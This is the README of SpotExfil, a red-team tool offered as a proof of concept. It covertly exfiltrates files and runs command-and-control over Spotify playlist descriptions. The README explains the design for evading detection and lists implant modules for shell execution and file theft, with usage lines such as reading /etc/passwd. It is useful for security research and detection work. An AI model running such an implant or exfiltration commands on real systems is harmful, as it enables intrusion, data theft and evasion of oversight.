[![CodeQL](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml)

# SpotExfil

A proof-of-concept covert channel and C2 framework that uses Spotify playlist descriptions as a communication medium, 512 characters at a time.

More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)

## How It Works

### Data Exfiltration

```
                    SPOTIFY API
                   (OAuth + REST)
                   /            \
            SENDER              RECEIVER
              |                     |
        +-----------+        +-----------+
        | File      |        | Reassemble|
        | -> Gzip   |        | -> Decrypt|
        | -> BLAKE2b|        | -> Verify |
        | -> AES-GCM|        | -> Decomp |
        | -> Base64 |        | -> Output |
        | -> Chunk  |        +-----------+
        +-----------+
```

1. **Compress**: Gzip the file (skipped automatically if no benefit)
2. **Encode**: Compute BLAKE2b integrity hash, encrypt with AES-256-GCM, Base64-encode, wrap in JSON
3. **Chunk**: Split payload into 512-character pieces (Spotify playlist description limit)
4. **Transmit**: Create private playlists with innocuous cover names, embed payload in descriptions, add filler tracks from random artists
5. **Retrieve**: Fetch playlists, sort by hidden index metadata, reassemble, decrypt, decompress, verify integrity hash

### Bidirectional C2

```
OPERATOR                      SPOTIFY (shared account)                 IMPLANT
   |                                                                      |
   |-- send_command() ------> [playlist: "Sunday Morning #k456"]          |
   |   (shell/exfil/sysinfo)   desc = HMAC-tag + AES-GCM(meta+cmd)       |
   |                            (fully encrypted, no plaintext)           |
   |                                                                      |
   |                                          _poll_and_execute() <-------|
   |                                          - decrypt command            |
   |                                          - execute module             |
   |                                          - DELETE cmd playlist        |
   |                                                                      |
   |                          [playlist: "Road Trip #b2c9"]       <-------|
   |                           desc = HMAC-tag + AES-GCM(meta+result)     |
   |                                                                      |
   |<-- poll_results()        - decrypt result                            |
   |    display output        - DELETE result playlist                    |
   |                                                                      |
   |   (zero playlists remain after full cycle)                           |
```

## Features

### Encryption and Encoding
- **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
- **Gzip compression** reduces payload size 60-80% for text (auto-skipped for incompressible data)
- **BLAKE2b integrity verification** on encode and decode

### Operational Security
- **Stealth playlist naming** using innocuous cover names (e.g., "Chill Vibes #a3f2")
- **Fully encrypted descriptions** -- no plaintext metadata exposed in C2 playlists
- **HMAC-derived tags** for fast playlist identification without decrypting every playlist
- **Aggressive cleanup** -- command playlists deleted by implant after execution, result playlists deleted by operator after retrieval
- **Jittered polling** -- configurable base interval + random jitter to avoid detection patterns
- **Random filler tracks** from a pool of 7 artists per playlist

### C2 Modules
- **shell** -- execute arbitrary shell commands, return stdout/stderr
- **exfil** -- read a file from the implant's filesystem
- **sysinfo** -- gather OS, hostname, username, IPs, PID, working directory

### Infrastructure
- **Sequenced command queue** with monotonic sequence numbers for ordering and result matching
- **Paginated playlist handling** (no 50-playlist limit)
- **Config file support** (`~/.spotexfil.conf`) so env vars are optional
- **Standalone executable** via PyInstaller (no Python environment needed)
- **Run-once in-memory implant** -- no persistence, no disk artifacts

## Prerequisites

1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
2. Add your redirect URI in the app settings (e.g., `http://127.0.0.1:8888/callback`)
3. Provide credentials via **environment variables** or **config file**:

### Option A: Environment Variables

```bash
export SPOTIFY_USERNAME=YourSpotifyUsername
export SPOTIFY_CLIENT_ID=your_client_id
export SPOTIFY_CLIENT_SECRET=your_client_secret
export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
```

### Option B: Config File

Create `~/.spotexfil.conf`:

```ini
[spotify]
username = YourSpotifyUsername
client_id = your_client_id
client_secret = your_client_secret
redirect_uri = http://127.0.0.1:8888/callback
```

Environment variables take precedence over config file values.

## Installation

### From source

```bash
pip install -r requirements.txt
```

### Standalone executable (no Python needed)

```bash
pip install pyinstaller
pyinstaller --onefile spotexfil.py
# Binary at: dist/spotexfil
```

For development (tests + linting):

```bash
pip install -r requirements-dev.txt
```

## Usage

### C2 Mode

```bash
# Terminal 1: Start the implant (polls every 30-90s with jitter)
python c2_implant.py -k "shared-secret" --interval 60 --jitter 30

# Terminal 2: Operator console
python c2_operator.py -k "shared-secret"
```

Operator commands:

```
c2> sysinfo                    # Gather system info from implant
c2> shell uname -a             # Execute shell command
c2> shell cat /etc/passwd      # Read a file via shell
c2> exfil /etc/resolv.conf     # Exfiltrate a file
c2> results                    # Poll for pending results
c2> wait 1                     # Block until seq=1 result arrives
c2> status                     # Show pending commands
c2> clean                      # Wipe all C2 playlists
c2> quit                       # Exit
```

### Data Exfiltration Mode

```bash
# Send (encrypted + compressed, cover names)
./spotexfil.py send -f /etc/resolv.conf -k "my-passphrase"

# Receive and decrypt
./spotexfil.py receive -k "my-passphrase"

# Receive and save to file
./spotexfil.py receive -k "my-passphrase" -o output.txt

# Clean up all payload playlists
./spotexfil.py clean
```

### Example: C2 sysinfo

```
$ python c2_operator.py -k "demo-key"
SpotExfil C2 Operator Console
Type 'help' for available commands.

c2> sysinfo
[*] Command queued: seq=1 module=sysinfo
c2> results
--- Result seq=1 [sysinfo] status=ok ---
  os: macOS-26.4-arm64-arm-64bit
  hostname: JMA.local
  username: jmamblat
  ips: ['127.0.0.1', '192.168.1.32']
  pid: 70851
  cwd: /Users/jmamblat/Documents/Code/spotexfil
---
```

### Example: Data Exfiltration

```
$ ./spotexfil.py send -f /etc/resolv.conf -k "demo-key"
[*] Data cleared (0 playlists removed)
[*] checksum plaintext 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
[*] original size: 256 bytes
[*] compressed: 198 bytes (saved 23%)
[*] payload encrypted with AES-256-GCM
[*] Generating playlists
    [*] Created [1/1] Chill Vibes #f7a2 (312 chars)
[*] Data encoded and sent (1 playlists)

$ ./spotexfil.py receive -k "demo-key"
[*] Retrieving playlists
    [*] Retrieved chunk 1: Chill Vibes #f7a2
[*] Retrieved 1 chunks
[*] integrity verified: 5673f6cea5b33041f92eab6f62a2b348a12f5d0d
# macOS Notice
# This file is not consulted for DNS hostname resolution...
```

## Testing

```bash
# Run all tests (132 tests)
pytest tests/ -v

# Run with coverage
pytest tests/ --cov=. --cov-report=term-missing

# Lint
flake8 *.py tests/*.py
```

Test suite covers:
- **Encoding**: BLAKE2b, AES-256-GCM, key derivation, compression, Base64
- **API**: Auth, config files, pagination, cover names, playlist CRUD (mocked)
- **Exfiltration**: Full roundtrips with compression, encryption, cover names, ordering
- **C2 protocol**: Message serialization, encrypted metadata, chunking, reassembly, HMAC tags
- **C2 integration**: Full command/result cycles, multi-command queue, channel isolation, cleanup verification, duplicate prevention, wrong-key rejection

## Project Structure

```
spotexfil/
├── spotexfil.py             # Unified CLI (send/receive/clean subcommands)
├── spotexfil_client.py      # Legacy CLI: exfiltrate a file
├── spotexfil_retrieve.py    # Legacy CLI: retrieve exfiltrated data
├── c2_operator.py           # C2 operator console (send commands, read results)
├── c2_implant.py            # C2 implant daemon (poll, execute, respond)
├── c2_protocol.py           # C2 message protocol (encrypt, chunk, reassemble)
├── spotapi.py               # Spotify API wrapper (auth, playlists, C2 channels)
├── encoding.py              # Compression, encryption, encoding, integrity
├── requirements.txt         # Runtime dependencies (spotipy, cryptography)
├── requirements-dev.txt     # Dev/test dependencies
├── setup.cfg                # flake8 + pytest config
└── tests/
    ├── test_encoding.py     # Encoding/crypto/compression tests
    ├── test_spotapi.py      # API + config + cover name tests
    ├── test_integration.py  # Exfiltration roundtrip tests
    ├── test_c2_protocol.py  # C2 protocol unit tests
    └── test_c2_integration.py # C2 full-stack integration tests
```

## Limitations

- **~1MB max payload** (~2000 playlists before Spotify limits)
- **Slow for large files** (1 API call per 512-character chunk)
- **Spotify rate limits** may throttle bulk operations
- C2 polling interval adds latency (configurable, default 30-90s)

## Disclaimer

This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use this tool for unauthorized data exfiltration or unauthorized access to computer systems. The author is not responsible for misuse.

## TODO

- Account rotation support
- Additional C2 modules (screenshot, keylog, persistence)
- Multi-account relay / dead drops for improved attribution resistance
- Steganographic payload encoding (natural-language cover text)
